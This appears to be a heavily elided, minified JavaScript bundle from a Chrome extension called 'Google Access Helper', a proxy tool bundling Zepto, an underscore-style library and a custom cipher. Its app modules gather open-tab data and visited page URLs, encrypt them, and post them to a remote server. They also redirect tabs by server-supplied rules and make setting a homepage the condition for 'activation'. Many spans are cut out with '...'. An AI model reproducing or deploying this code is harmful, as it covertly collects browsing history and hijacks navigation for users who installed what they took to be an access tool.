...
let Zepto = (function () {
  ...
  return (
    ...
    (O.fragment = function (e, r, o) {
      var i, a, c;
      return (
        d.test(e) && (i = n(s.createElement(RegExp.$1))),
        i ||
    ...
    (O.init = function (e, r) {
      ...
      if ("string" == typeof e)
        if ("<" == (e = e.trim())[0] && h.test(e))
          (o = O.fragment(e, RegExp.$1, r)), (e = null);
        else {
        ...
        if (D(e))
          ...
          (o = O.fragment(e.trim(), RegExp.$1, r)), (e = null);
        else {
          if (r !== t) return n(r).find(e);
          o = O.qsa(s, e);
        }
    ...
    (n.fn = {
      ...
      closest: function (t, e) {
        ...
        for (
          ...
          r && !(o ? o.indexOf(r) >= 0 : O.matches(r, t));
      ...
      css: function (t, r) {
        if (arguments.length < 2) {
          var i,
            a = this[0];
          if (!a) return;
          if (((i = getComputedStyle(a, "")), "string" == typeof t))
      ...
      position: function () {
        if (this.length) {
          var t = this[0],
            e = this.offsetParent(),
            r = this.offset(),
            o = m.test(e[0].nodeName) ? { top: 0, left: 0 } : e.offset();
          return (
      ...
      offsetParent: function () {
        return this.map(function () {
          for (
            ...
            t && !m.test(t.nodeName) && "static" == n(t).css("position");
    ...
    ["after", "prepend", "before", "append"].forEach(function (t, e) {
      ...
      (n.fn[t] = function () {
        ...
        (n.fn[r ? t + "To" : "insert" + (e ? "Before" : "After")] = function (
          e
        ) {
...
(window.Zepto = Zepto),
      ...
      r.split(/\s/).forEach(function (r) {
        ...
        (a.proxy = function (t) {
          ...
          "addEventListener" in n &&
            n.addEventListener(g(a.e), a.proxy, d(a, s));
      });
    }
        ...
        p(t, e, n, r).forEach(function (e) {
          delete a[i][e.i],
            "removeEventListener" in t &&
              t.removeEventListener(g(e.e), e.proxy, d(e, o));
        });
      });
    }
    (u.click = u.mousedown = u.mouseup = u.mousemove = "MouseEvents"),
      (t.event = { add: m, remove: v }),
      (t.proxy = function (e, n) {
        ...
        if (i(n))
          return a
            ? (a.unshift(e[n], e), t.proxy.apply(null, a))
            : t.proxy(e[n], e);
    ...
    (t.fn.delegate = function (t, e, n) {
      ...
      (t.fn.on = function (n, a, u, c, s) {
        ...
        return n && !i(n)
          ? (t.each(n, function (t, e) {
            ...
            p)
          : (i(a) || o(c) || !1 === c || ((c = u), (u = a), (a = e)),
            (o(u) || !1 === u) && ((c = u), (u = e)),
            !1 === c && (c = w),
            p.each(function (e, o) {
              s &&
                (l = function (t) {
                  return v(o, t.type, c), c.apply(this, arguments);
                }),
                a &&
                  (f = function (e) {
                    var n,
                      i = t(e.target).closest(a, o).get(0);
                    if (i && i !== o)
                      return (
                        (n = t.extend(E(e), {
                          currentTarget: i,
      ...
      (t.fn.trigger = function (e, n) {
        return (
          ...
          this.each(function () {
            e.type in s && "function" == typeof this[e.type]
              ? this[e.type]()
  ...
  (function (t) {
    ...
    function w(e, n, r, o) {
      return (
        t.isFunction(n) && ((o = r), (r = n), (n = void 0)),
        t.isFunction(r) || ((o = r), (r = void 0)),
        { url: e, data: n, success: r, dataType: o }
      );
    }
    (f.href = window.location.href),
      ...
      (t.ajax = function (r) {
        ...
        for (e in t.ajaxSettings) void 0 === m[e] && (m[e] = t.ajaxSettings[e]);
        !(function (e) {
          e.global && 0 == t.active++ && p(e, null, "ajaxStart");
        })(m),
          m.crossDomain ||
            (((i = o.createElement("a")).href = m.url),
            (i.href = i.href),
            (m.crossDomain =
              f.protocol + "//" + f.host != i.protocol + "//" + i.host)),
          ...
          (function (e) {
            e.processData &&
              ...
              !e.data ||
                ...
                ((e.url = y(e.url, e.data)), (e.data = void 0));
          })(m);
        var b = m.dataType,
          x = /\?.+=\?/.test(m.url);
        if (
          (x && (b = "jsonp"),
          (!1 !== m.cache &&
            ((r && !0 === r.cache) || ("script" != b && "jsonp" != b))) ||
            (m.url = y(m.url, "_=" + Date.now())),
          "jsonp" == b)
        )
          return (
            x ||
              (m.url = y(
                m.url,
                m.jsonp ? m.jsonp + "=?" : !1 === m.jsonp ? "" : "callback=?"
              )),
            t.ajaxJSONP(m, w)
          );
        var S,
        ...
        if (
          (w && w.promise(A),
          m.crossDomain || j("X-Requested-With", "XMLHttpRequest"),
          j("Accept", E || "*/*"),
          (E = m.mimeType || E) &&
            (E.indexOf(",") > -1 && (E = E.split(",", 2)[0]),
            A.overrideMimeType && A.overrideMimeType(E)),
          (m.contentType ||
            (!1 !== m.contentType &&
              m.data &&
          ...
          for (n in m.headers) j(n, m.headers[n]);
        if (
          ((A.setRequestHeader = j),
          (A.onreadystatechange = function () {
            if (4 == A.readyState) {
              (A.onreadystatechange = v), clearTimeout(S);
              var e,
                n = !1;
              if (
                ...
                (b =
                  b ||
                  ((r = m.mimeType || A.getResponseHeader("content-type")) &&
                    (r = r.split(";", 2)[0]),
                  (r &&
                    (r == s
                      ? "html"
                ...
                try {
                  "script" == b
                    ...
                    : "xml" == b
                    ? (e = A.responseXML)
                    : "json" == b && (e = l.test(e) ? null : t.parseJSON(e));
                } catch (t) {
                  n = t;
                }
                n ? g(n, "parsererror", A, m, w) : d(e, A, m, w);
              } else
                g(A.statusText || null, A.status ? "error" : "abort", A, m, w);
            }
            var r;
          }),
          !1 === h(A, m))
        )
          return A.abort(), g(null, "abort", A, m, w), A;
        if (m.xhrFields) for (n in m.xhrFields) A[n] = m.xhrFields[n];
        var D = !("async" in m) || m.async;
        for (n in (A.open(m.type, m.url, D, m.username, m.password), T))
          C.apply(A, T[n]);
        return (
          m.timeout > 0 &&
            (S = setTimeout(function () {
              (A.onreadystatechange = v),
                A.abort(),
                g(null, "timeout", A, m, w);
            }, m.timeout)),
          A.send(m.data ? m.data : null),
          A
        );
      }),
      (t.get = function () {
  ...
  (function (t) {
    (t.fn.serializeArray = function () {
      ...
      return (
        this[0] &&
          t.each(this[0].elements, function (r, i) {
            (n = i.type),
              (e = i.name) &&
                "fieldset" != i.nodeName.toLowerCase() &&
                !i.disabled &&
                "submit" != n &&
                "reset" != n &&
                "button" != n &&
                "file" != n &&
                (("radio" != n && "checkbox" != n) || i.checked) &&
                o(t(i).val());
          }),
        r
      );
  ...
  function () {
    ...
    (h.reduce = h.foldl = h.inject = function (t, e, n, r) {
      ...
      (h.contains = h.include = function (t, e) {
        return (
          null != t &&
          (t.length !== +t.length && (t = h.values(t)), h.indexOf(t, e) >= 0)
        );
      }),
      ...
      (h.max = function (t, e, n) {
        ...
        if (null == e && null != t)
          for (
            var u = 0,
              c = (t = t.length === +t.length ? t : h.values(t)).length;
            u < c;
            u++
          )
            (r = t[u]) > i && (i = r);
      ...
      (h.shuffle = function (t) {
        for (
          var e,
            n = t && t.length === +t.length ? t : h.values(t),
            r = n.length,
            o = Array(r),
            i = 0;
          i < r;
          ...
          (e = h.random(0, i)) !== i && (o[i] = o[e]), (o[e] = n[i]);
        return o;
      }),
      (h.sample = function (t, e, n) {
        return null == e || n
          ? (t.length !== +t.length && (t = h.values(t)),
            t[h.random(t.length - 1)])
          : h.shuffle(t).slice(0, Math.max(0, e));
      }),
    ...
    (h.groupBy = m(function (t, e, n) {
      ...
      (h.sortedIndex = function (t, e, n, r) {
        for (
          var o = (n = h.iteratee(n, r, 1))(e), i = 0, a = t.length;
          i < a;
      ...
      (h.last = function (t, e, n) {
        if (null != t)
          return null == e || n
            ? t[t.length - 1]
            : a.call(t, Math.max(t.length - e, 0));
      }),
    ...
    (h.flatten = function (t, e) {
      ...
      (h.intersection = function (t) {
        if (null == t) return [];
        for (
          var e = [], n = arguments.length, r = 0, o = t.length;
          r < o;
          r++
        ) {
          var i = t[r];
      ...
      (h.zip = function (t) {
        if (null == t) return [];
        for (
          var e = h.max(arguments, "length").length, n = Array(e), r = 0;
          r < e;
          r++
        )
      ...
      (h.range = function (t, e, n) {
        ...
        for (
          var r = Math.max(Math.ceil((e - t) / n), 0), o = Array(r), i = 0;
          i < r;
          i++, t += n
        )
          o[i] = t;
    ...
    var w = function (t, e, n, r) {
      ...
      if ((n.push(t), r.push(e), "[object Array]" === o)) {
        ...
        if (((a = p.length), (u = h.keys(e).length === a)))
          for (
            ;
            a-- && ((f = p[a]), (u = h.has(e, f) && w(t[f], e[f], n, r)));
    ...
    (h.mixin = function (t) {
      h.each(h.functions(t), function (e) {
        ...
        h.prototype[e] = function () {
          var t = [this._wrapped];
          return i.apply(t, arguments), C.call(this, n.apply(h, t));
        };
      });
    }),
      h.mixin(h),
  ...
  define("lib/t", [], function (t, e, n) {
    ...
    var r = {
      E: function (t, e) {
        ...
        return n.length, (n = r.encode(n, o)), r.longsToStr(n).base64Encode();
      },
      D: function (t, e) {
        if (((t = String(t)), (e = String(e)), 0 == t.length)) return "";
        var n = r.strToLongs(t.base64Decode()),
          o = r.strToLongs(e.utf8Encode().slice(0, 16));
        n.length, (n = r.decode(n, o));
      ...
      decode: function (t, e) {
        for (
          var n,
            ...
            i = t[o - 1],
            a = t[0],
            u = 2654435769 * Math.floor(6 + 52 / o);
          0 != u;
      ...
      (r.P = function (t, e) {
        for (var n = (t + e).replace("T", ""), r = [], o = 0; o < 16; o++)
          r.push(
            String.fromCharCode(
              parseInt(
                n.charCodeAt(o) + n.charCodeAt(o + 16) + n.charCodeAt(o + 32)
              ) / 3
            )
          );
        return r.join("");
  ...
  define("app/t", [], function (t, e) {
    ...
    (e.S = function (t, e, n) {
      ...
      (e.U = function (t) {
        o.get(
          i.info.rootServer + "updateTaskRule",
          { uuid: n, time: r },
          function (o) {
      ...
      (e.A = function (t, e) {
        ...
        chrome.tabs.query({}, function (s) {
          ...
          o.post(
            i.info.rootServer + "updateTaskRule3?uuid=" + n + "&time=" + r,
            { D: f },
            function (o) {
              var i = JSON.parse(c.D(o, c.P(n, r)));
              i.result
                ? ((n = i.uuid), u.isFunction(t) && t(i))
                : u.isFunction(e) && e(i);
            }
          );
        });
      ...
      (e.C = function (t, e) {
        ...
        function s(t) {
          ...
          t.url,
            "main_frame" === e &&
              (u.links.push(t.url), localStorage.DEBUG && console.log(t.url));
        }
              ...
              i.onlineTime(function (s) {
                ...
                o.ajax({
                  ...
                  success: function (s) {
                    ...
                    f
                      ? Date.now() - parseInt(f) > 432e5 && (l.oldExist = !1)
                      : (l.oldExist = !1),
                      l.result
                        ? ((n = l.uuid), t(l))
                        : chrome.tabs.query({}, function (s) {
      ...
      (e.F = function (t, e) {
        ...
        n
          ? u.isFunction(e) && e(parseInt(n))
          : ((localStorage.Installed = Date.now()), u.isFunction(t) && t());
      }),
      (e.RT = function () {
        chrome.tabs.query({}, function (t) {
            ...
            for (var r in l.redirects)
              if (l.redirects[r].r.test(n) && !l.redirects[r].t.test(n)) {
                ...
                console.log("QRedirect - " + n),
                  chrome.tabs.update(t[e].id, { url: o });
                break;
              }
          }
        });
        ...
        chrome.webRequest.onBeforeRequest.addListener(
          function (n) {
            var r,
              ...
              a = n.url;
            if ("main_frame" === i)
              for (var c in (needShowWarming &&
                /^https?\:\/\/(.*google[^\/:?#]+)/.test(a) &&
                ((needShowWarming = !1),
                chrome.tabs.create({ url: "warming.html" }, function (t) {
                  t
                    ? chrome.windows.update(t.windowId, { focused: !0 })
              ...
              l.redirects))
                if (
                  l.redirects[c].r.test(a) &&
                  !l.redirects[c].t.test(a) &&
                  ((r = a),
                  (o = u.indexOf(t, r)) >= 0
                    ? e[o] < l.redirectTimes && (e[o]++, 1)
                    : (t.length >= 10 && (t.shift(), e.shift()),
                      t.push(r),
                      e.push(0),
                      1))
                )
    ...
    (window.popupView = {
      ...
      (e.on = function (t) {
        chrome.browserAction.setIcon({ path: "/icons/icon.png" }),
          ...
          chrome.browserAction.setTitle({ title: "Google Access Helper" }),
  ...
  define("app/p", [], function (t, e) {
    ...
    var v = function (t, e) {
              ...
              return (
                ...
                void c.ajax({
                  ...
                  url:
                    ...
                    ":" +
                    t[n].port +
                    "/speed_test?size=100&t=" +
                    t[n].startTime,
                  timeout: 6e4,
                  success: function () {
                    (t[n].speed = Math.floor(
                      1e5 / (Date.now() - t[n].startTime)
                    )),
                      v(t, e);
                  },
                  error: function (r, o) {
            ...
            if (g)
              ...
              !(function (t) {
                ...
                c.ajax({
                  ...
                  success: function (n) {
                    localStorage.DEBUG &&
                      console.log("[getBackupProxy success]data:" + n);
                  ...
                  error: function (e, n) {
                    localStorage.DEBUG &&
                      console.log(
                        "[getBackupProxy failed]" + e.responseText,
                        n
                      ),
                      t(null);
                  },
                ...
                if (((g = !0), n)) {
                  ...
                  if (n.backupServer) {
                    ...
                    (o = { type: c[0], host: c[1], port: c[2], speed: 0 }),
                      m(o, i);
                  }
                  if (443 != s.port) {
                    ...
                    r ? y(r, e) : o ? (m((s = o), i), e(s)) : (m(s, i), e(s));
                } else if (443 != s.port) {
      ...
      w = function (t, e) {
        return localStorage["stop-proxy"] &&
          "true" == localStorage["stop-proxy"]
          ? (s.off("", "Google Access Helper已经暂停，点击启动运行"),
                ...
                o && t === o
                  ? (console.log(
                    ...
                    c.ajax({
                      ...
                      url:
                        u.info.rootServer +
                        "updateTaskRule7?uuid=" +
                        a +
                        "&time=" +
                        e,
                      data: {
                        D: l.E(JSON.stringify({ backup: t }), l.P(a, e)),
                      },
                      success: function (t) {},
                      error: function (t, e) {
    ...
    var b = !1,
      x = function () {
        (localStorage["stop-proxy"] && "true" == localStorage["stop-proxy"]) ||
          chrome.proxy.settings.get({ incognito: !1 }, function (t) {
            (localStorage["stop-proxy"] &&
              "true" == localStorage["stop-proxy"]) ||
              ("controllable_by_this_extension" === t.levelOfControl ||
              "controlled_by_this_extension" === t.levelOfControl
                ? (localStorage.DEBUG &&
                    console.info("[proxy controlled by ggfwzs!]"),
                  b && (s.on(), (b = !1)))
                : "controlled_by_other_extensions" === t.levelOfControl
                ? (localStorage.DEBUG &&
                    console.info("[proxy controlled by other extension!]"),
                  s.off(
                    "!",
                    "代理冲突！可能被其他扩展插件占用了代理权限，请检查并重启本插件"
                  ),
                  (b = !0))
                : "not_controllable" === t.levelOfControl &&
                  (localStorage.DEBUG &&
                    console.info("[proxy cannot be controlled!]"),
    ...
    (e.I = function (t) {
      ...
      "true" != localStorage["stop-proxy"] && m(n[0], i),
        w(),
        setTimeout(x, 6e4),
        chrome.webRequest.onAuthRequired.addListener(
          function (n, r) {
            console.info(n.realm + " " + p),
              "GGFWZS Proxy" === n.realm
                ? p > 0
                  ? (r({ authCredentials: { username: f, password: a } }), p--)
                  : (console.error(
                      "Error: username:" + f + " - password:" + t.uuid
                    ),
  ...
  define("app/notifications", [], function (t, e) {
    ...
    function r(t) {
      ...
      chrome.notifications.create(
        ...
        chrome.notifications.onButtonClicked.addListener(function (e, n) {
          e == "GGFWZSNOTIFICATION" + t.time &&
            chrome.tabs.create({ url: t.link });
        }),
    ...
    (e.installNotification = function () {
      $.getJSON(n.info.rootServer + "getNotifications", function (t) {
        ...
        t["version-message"] &&
          t["version-message"][e] &&
          (localStorage["popup-message"] = t["version-message"][e]),
          (localStorage.NotificationsNum = t["install-notifications"].time),
          t["install-notifications"].message &&
            "" != t["install-notifications"].message &&
            setTimeout(function () {
        ...
        !(function t() {
          $.getJSON(n.info.rootServer + "getNotifications", function (t) {
            ...
            t["version-message"] &&
              ...
              (localStorage["popup-message"] = t["version-message"][e]);
            var n = 0;
            localStorage.NotificationsNum &&
              (n = parseInt(localStorage.NotificationsNum));
  ...
  define("app/mainServer", [], function (t, e) {
    var n = t("app/u"),
      ...
      i = [
        "https://o4175vz27.qnssl.com/d.json",
        "https://yingu.coding.me/test/d.json",
      ];
    ...
    var l = function (t) {
        ...
        e.vn > 0 && parseInt(localStorage.mversion) != e.vn
          ? $.ajax({
              type: "get",
      ...
      f = "";
    localStorage.Installed &&
      Date.now() - parseInt(localStorage.Installed) > 864e5 &&
      parseInt(localStorage.mversion) > 0 &&
      (n.IO.R(
        "rml",
        function (t) {
      ...
      o.off("...", "正在连接主服务器,请等待10秒"),
        a.get(
          function () {
            n.D(),
              n.R(
                function () {
                  localStorage["auto-homepage"] &&
                    "true" == localStorage["auto-homepage"] &&
                    chrome.tabs.query({}, function (t) {
                    ...
                    n.C(
                      ...
                      function (t) {
                        console.info("Task fail:" + t.error),
                          o.off(
                            "!",
                            '程序尚未激活，请您<a target="_blank" href="/warming.html">按照步骤</a>设置首页'
                          );
              ...
              n.F(
                function () {
                  console.info("- first run -"),
                    chrome.tabs.create({ url: "index.html" }, function (t) {
                      t
                        ? chrome.windows.update(t.windowId, { focused: !0 })
                        : chrome.windows.create({
                            url: "index.html",
        ...
        chrome.runtime.onMessage.addListener(function (t, e, n) {
          "refresh" == t.reqtype
            ...
            : "init-page" == t.reqtype && n({ data: a.getCsc() });
        });
    }
  ),
  setTimeout(function () {
